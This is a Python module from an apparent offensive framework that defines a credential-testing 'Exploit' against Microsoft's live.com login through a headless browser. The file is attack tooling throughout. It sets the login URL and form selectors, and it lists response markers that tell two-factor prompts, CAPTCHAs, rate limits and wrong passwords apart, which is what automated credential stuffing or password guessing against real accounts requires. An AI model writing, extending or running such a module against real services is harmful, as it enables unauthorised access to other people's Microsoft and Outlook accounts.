"""Microsoft/Outlook Credential Tester — headless-browser login flow."""
from webforg.modules.auth.base_login_tester import BaseSocialLoginTester


class Exploit(BaseSocialLoginTester):
    name = "Microsoft/Outlook Credential Tester"
    description = "Tests credentials against Microsoft Online login via a headless browser."
    author = "K0uR1i"
    rank = "manual"

    platform_name = "microsoft"
    browser_login_url = "https://login.live.com/login.srf?wa=wsignin1.0"
    username_selector = "input[name=loginfmt]"
    username_submit_selector = "input[type=submit]"
    password_selector = "input[name=passwd]"
    submit_enter = True
    submit_selectors = ("input[type=submit]", "button[type=submit]")
    browser_login_paths = ("/login", "/oauth20")
    twofa_markers = (
        "two-step verification", "two-factor", "two factor", "2fa",
        "verification code", "verify your identity", "help us protect your account",
        "approve sign-in request",
    )
    challenge_markers = (
        "captcha", "security check", "unusual activity", "are you a robot",
        "suspicious activity", "verify you're human",
    )
    rate_markers = (
        "too many attempts", "try again later", "temporarily", "rate limit",
        "many attempts", "you've tried",
    )
    invalid_markers = (
        "that microsoft account doesn't exist", "doesn't exist", "no account with that name",
        "your account or password is incorrect", "incorrect password", "wrong password",
        "password is incorrect", "invalid password",
    )
